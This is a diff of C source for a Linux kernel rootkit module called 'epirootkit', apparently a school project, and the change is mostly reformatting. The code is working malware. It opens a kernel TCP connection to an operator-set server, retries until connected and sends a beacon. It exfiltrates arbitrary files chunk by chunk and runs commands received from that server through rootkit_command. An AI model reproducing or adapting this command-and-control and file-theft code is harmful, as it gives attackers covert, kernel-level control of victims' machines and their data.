@@ -1,10 +1,11 @@
-#include <linux/kernel.h>
-#include <linux/net.h>
-#include <linux/module.h>
-#include <linux/socket.h>
-#include <linux/inet.h>
-#include <linux/kthread.h>
 #include <linux/delay.h>
+#include <linux/inet.h>
+#include <linux/kernel.h>
+#include <linux/kthread.h>
+#include <linux/module.h>
+#include <linux/net.h>
+#include <linux/socket.h>
+
 #include "epirootkit.h"
 
 struct socket *sock = NULL;
@@ -19,14 +20,13 @@ int network_worker(void *data);
  *
  * @return SUCCESS
  */
-int close_socket(void)
-{
-	if (sock) {
-		sock_release(sock);
-		sock = NULL;
-		DBG_MSG("close_socket: socket released\n");
-	}
-	return SUCCESS;
+int close_socket(void) {
+    if (sock) {
+        sock_release(sock);
+        sock = NULL;
+        DBG_MSG("close_socket: socket released\n");
+    }
+    return SUCCESS;
 }
 
 /**
@@ -46,115 +46,115 @@ int close_socket(void)
  *         their meanings should be documented in the implementation.
  */
 int send_to_server(char *message, ...) {
-	struct kvec vec = {0};
-	struct msghdr msg = {0};
-	int ret_code = 0;
-	va_list args;
-	char *formatted_message;
-	bool truncated = false;
+    struct kvec vec = { 0 };
+    struct msghdr msg = { 0 };
+    int ret_code = 0;
+    va_list args;
+    char *formatted_message;
+    bool truncated = false;
 
-	formatted_message = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-	if (!formatted_message) {
-		ERR_MSG("send_to_server: memory allocation failed\n");
-		return -ENOMEM;
-	}
+    formatted_message = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    if (!formatted_message) {
+        ERR_MSG("send_to_server: memory allocation failed\n");
+        return -ENOMEM;
+    }
 
-	if (!sock) {
-		ERR_MSG("send_to_server: socket is NULL\n");
-		kfree(formatted_message);
-		return -FAILURE;
-	}
+    if (!sock) {
+        ERR_MSG("send_to_server: socket is NULL\n");
+        kfree(formatted_message);
+        return -FAILURE;
+    }
 
-	// Format the message with additional arguments
-	va_start(args, message);
-	int written = vsnprintf(formatted_message, STD_BUFFER_SIZE, message, args);
-	
-	if(written < 0) {
-		ERR_MSG("send_to_server: vsnprintf failed\n");
-		kfree(formatted_message);
-		va_end(args);
-		return -FAILURE;
-	}
+    // Format the message with additional arguments
+    va_start(args, message);
+    int written = vsnprintf(formatted_message, STD_BUFFER_SIZE, message, args);
 
-	va_end(args);
+    if (written < 0) {
+        ERR_MSG("send_to_server: vsnprintf failed\n");
+        kfree(formatted_message);
+        va_end(args);
+        return -FAILURE;
+    }
 
-	// Check if the message was truncated
-	if (strlen(message) >= STD_BUFFER_SIZE) {
-		truncated = true;
-		strncat(formatted_message, " (truncated msg)", STD_BUFFER_SIZE - strlen(formatted_message) - 1);
-	}
+    va_end(args);
 
-	vec.iov_base = formatted_message;
-	vec.iov_len = strlen(formatted_message);
+    // Check if the message was truncated
+    if (strlen(message) >= STD_BUFFER_SIZE) {
+        truncated = true;
+        strncat(formatted_message, " (truncated msg)", STD_BUFFER_SIZE - strlen(formatted_message) - 1);
+    }
 
-	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-	if (ret_code < 0) {
-		ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
-		kfree(formatted_message);
-		return -FAILURE;
-	}
+    vec.iov_base = formatted_message;
+    vec.iov_len = strlen(formatted_message);
 
-	kfree(formatted_message);
+    ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+    if (ret_code < 0) {
+        ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
+        kfree(formatted_message);
+        return -FAILURE;
+    }
 
-	return SUCCESS;
+    kfree(formatted_message);
+
+    return SUCCESS;
 }
 
 int send_file_to_server(char *filename) {
-	struct file *file = NULL;
-	char *buffer = NULL;
-	loff_t pos = 0;
-	ssize_t read_size;
-	int ret_code = 0;
+    struct file *file = NULL;
+    char *buffer = NULL;
+    loff_t pos = 0;
+    ssize_t read_size;
+    int ret_code = 0;
 
-	// Allocation du buffer pour les chunks
-	buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
-	if (!buffer) {
-		ERR_MSG("send_file_to_server: failed to allocate buffer\n");
-		return -ENOMEM;
-	}
-	memset(buffer, 0, STD_BUFFER_SIZE);
+    // Allocation du buffer pour les chunks
+    buffer = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    if (!buffer) {
+        ERR_MSG("send_file_to_server: failed to allocate buffer\n");
+        return -ENOMEM;
+    }
+    memset(buffer, 0, STD_BUFFER_SIZE);
 
-	// Ouverture du fichier
-	file = filp_open(filename, O_RDONLY, 0);
-	if (IS_ERR(file)) {
-		ERR_MSG("send_file_to_server: failed to open file %s\n", filename);
-		kfree(buffer);
-		return -ENOENT;
-	}
+    // Ouverture du fichier
+    file = filp_open(filename, O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        ERR_MSG("send_file_to_server: failed to open file %s\n", filename);
+        kfree(buffer);
+        return -ENOENT;
+    }
 
-	// Lecture et envoi du fichier chunk par chunk
-	while ((read_size = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
-		struct kvec vec = {
-			.iov_base = buffer,
-			.iov_len = read_size
-		};
-		struct msghdr msg = {0};
+    // Lecture et envoi du fichier chunk par chunk
+    while ((read_size = kernel_read(file, buffer, STD_BUFFER_SIZE, &pos)) > 0) {
+        struct kvec vec = {
+            .iov_base = buffer,
+            .iov_len = read_size
+        };
+        struct msghdr msg = { 0 };
 
-		ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-		if (ret_code < 0) {
-			ERR_MSG("send_file_to_server: failed to send chunk: %d\n", ret_code);
-			filp_close(file, NULL);
-			kfree(buffer);
-			return -FAILURE;
-		}
-		memset(buffer, 0, STD_BUFFER_SIZE);
-	}
+        ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+        if (ret_code < 0) {
+            ERR_MSG("send_file_to_server: failed to send chunk: %d\n", ret_code);
+            filp_close(file, NULL);
+            kfree(buffer);
+            return -FAILURE;
+        }
+        memset(buffer, 0, STD_BUFFER_SIZE);
+    }
 
-	if (read_size < 0) {
-		ERR_MSG("send_file_to_server: failed to read file \"%s\" during send\n", filename);
-		ret_code = -FAILURE;
-	} else {
-		DBG_MSG("send_file_to_server: file \"%s\" sent successfully\n", filename);
-		ret_code = SUCCESS;
-	}
+    if (read_size < 0) {
+        ERR_MSG("send_file_to_server: failed to read file \"%s\" during send\n", filename);
+        ret_code = -FAILURE;
+    }
+    else {
+        DBG_MSG("send_file_to_server: file \"%s\" sent successfully\n", filename);
+        ret_code = SUCCESS;
+    }
 
-	// Nettoyage
-	filp_close(file, NULL);
-	kfree(buffer);
+    // Nettoyage
+    filp_close(file, NULL);
+    kfree(buffer);
 
-	return ret_code;
+    return ret_code;
 }
-
 
 /**
  * @brief Kernel thread function for managing network communication.
@@ -165,119 +165,119 @@ int send_file_to_server(char *filename) {
  * @note The thread will periodically retry operations such as connecting to the server
  *       or sending messages if they fail.
  */
-int network_worker(void *data)
-{
-	struct sockaddr_in addr = { 0 };
-	unsigned char ip_binary[4] = { 0 };
-	int ret_code = 0;
+int network_worker(void *data) {
+    struct sockaddr_in addr = { 0 };
+    unsigned char ip_binary[4] = { 0 };
+    int ret_code = 0;
 
-	// Convert IP address string into 4-byte binary format
-	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
-		ERR_MSG("network_worker: invalid IPv4\n");
-		return -FAILURE;
-	}
+    // Convert IP address string into 4-byte binary format
+    if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
+        ERR_MSG("network_worker: invalid IPv4\n");
+        return -FAILURE;
+    }
 
-	// Create a TCP socket in kernel space
-	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-	if (ret_code < 0) {
-		ERR_MSG("network_worker: socket creation failed: %d\n", ret_code);
-		return -FAILURE;
-	}
+    // Create a TCP socket in kernel space
+    ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+    if (ret_code < 0) {
+        ERR_MSG("network_worker: socket creation failed: %d\n", ret_code);
+        return -FAILURE;
+    }
 
-	// Prepare the sockaddr_in structure for the server we want to connect to
-	addr.sin_family = AF_INET;
-	addr.sin_port = htons(port);
-	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
+    // Prepare the sockaddr_in structure for the server we want to connect to
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
 
-	// Attempt to connect to the remote server
-	// Retry periodically until the thread is stopped or the connection succeeds
-	while (!kthread_should_stop()) {
-		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
-		if (ret_code < 0) {
-			ERR_MSG("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
-			msleep(TIMEOUT_BEFORE_RETRY);
-			continue;
-		}
+    // Attempt to connect to the remote server
+    // Retry periodically until the thread is stopped or the connection succeeds
+    while (!kthread_should_stop()) {
+        ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
+        if (ret_code < 0) {
+            ERR_MSG("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
+            msleep(TIMEOUT_BEFORE_RETRY);
+            continue;
+        }
 
-		// Connection successful
-		break; 
-	}
+        // Connection successful
+        break;
+    }
 
-	// Attempt to send the initial message using send_to_server
-	int attempts = 0;
-	do {
-		ret_code = send_to_server(message);
-		if (ret_code != SUCCESS) {
-			ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
-			msleep(TIMEOUT_BEFORE_RETRY);
-			attempts++;
-		}
-	} while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);
+    // Attempt to send the initial message using send_to_server
+    int attempts = 0;
+    do {
+        ret_code = send_to_server(message);
+        if (ret_code != SUCCESS) {
+            ERR_MSG("network_worker: failed to send message, retrying... (attempt %d/%d)\n", attempts + 1, MAX_MSG_SEND_OR_RECEIVE_ERROR);
+            msleep(TIMEOUT_BEFORE_RETRY);
+            attempts++;
+        }
+    } while (ret_code != SUCCESS && attempts < MAX_MSG_SEND_OR_RECEIVE_ERROR);
 
-	// If all attempts to send the message failed, abort
-	if (ret_code < 0) {
-		ERR_MSG("network_worker: failed to send message after 10 attempts, giving up.\n");
-		return -FAILURE;
-	}
+    // If all attempts to send the message failed, abort
+    if (ret_code < 0) {
+        ERR_MSG("network_worker: failed to send message after 10 attempts, giving up.\n");
+        return -FAILURE;
+    }
 
-	DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);
+    DBG_MSG("network_worker: message sent to %s:%d\n", ip, port);
 
-	// Count of empty messages in a row received
-	// This is used to determine if the server is still active
-	// and to avoid flooding the server with empty messages
-	unsigned empty_count = 0;
-	// Listen for commands
-	// Retry until 'killcom' is received or thread is stopped by unmonting the module
-	while (!kthread_should_stop() && !thread_exited) {
-		struct kvec recv_vec;
-		struct msghdr recv_msg = { 0 };
+    // Count of empty messages in a row received
+    // This is used to determine if the server is still active
+    // and to avoid flooding the server with empty messages
+    unsigned empty_count = 0;
+    // Listen for commands
+    // Retry until 'killcom' is received or thread is stopped by unmonting the module
+    while (!kthread_should_stop() && !thread_exited) {
+        struct kvec recv_vec;
+        struct msghdr recv_msg = { 0 };
 
-		char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
-		if (!recv_buffer) {
-			ERR_MSG("network_worker: failed to allocate recv_buffer\n");
-			break;
-		}
+        char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
+        if (!recv_buffer) {
+            ERR_MSG("network_worker: failed to allocate recv_buffer\n");
+            break;
+        }
 
-		recv_vec.iov_base = recv_buffer;
-		recv_vec.iov_len = RCV_CMD_BUFFER_SIZE;
+        recv_vec.iov_base = recv_buffer;
+        recv_vec.iov_len = RCV_CMD_BUFFER_SIZE;
 
-		// Wait to receive a message from the server
-		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
-		if (ret_code < 0) {
-			ERR_MSG("network_worker: error receiving message: %d\n", ret_code);
-			msleep(TIMEOUT_BEFORE_RETRY);
-			continue;
-		}
+        // Wait to receive a message from the server
+        ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
+        if (ret_code < 0) {
+            ERR_MSG("network_worker: error receiving message: %d\n", ret_code);
+            msleep(TIMEOUT_BEFORE_RETRY);
+            continue;
+        }
 
-		// Null-terminate the received message
-		recv_buffer[ret_code] = '\0';
-		DBG_MSG("network_worker: received: %s", recv_buffer);
+        // Null-terminate the received message
+        recv_buffer[ret_code] = '\0';
+        DBG_MSG("network_worker: received: %s", recv_buffer);
 
-		// Check if the received message is empty
-		if (recv_buffer[0] == '\0') {
-			empty_count++;
-			if (empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR) {
-				ERR_MSG("network_worker: too many empty messages, exiting...\n");
-				break;
-			}
-			continue;
-		} else {
-			empty_count = 0; // Reset the empty message count
-		}
+        // Check if the received message is empty
+        if (recv_buffer[0] == '\0') {
+            empty_count++;
+            if (empty_count > MAX_MSG_SEND_OR_RECEIVE_ERROR) {
+                ERR_MSG("network_worker: too many empty messages, exiting...\n");
+                break;
+            }
+            continue;
+        }
+        else {
+            empty_count = 0; // Reset the empty message count
+        }
 
-		if(strcmp(recv_buffer, "\n") != 0)
-			rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
+        if (strcmp(recv_buffer, "\n") != 0)
+            rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
 
-		kfree(recv_buffer);
-		recv_buffer = NULL;
-	}
+        kfree(recv_buffer);
+        recv_buffer = NULL;
+    }
 
-	if(restart_on_error)
-		network_worker(data);
+    if (restart_on_error)
+        network_worker(data);
 
-	// Final cleanup before thread exits
-	thread_exited = true;
-	close_socket();
+    // Final cleanup before thread exits
+    thread_exited = true;
+    close_socket();
 
-	return SUCCESS;
+    return SUCCESS;
 }
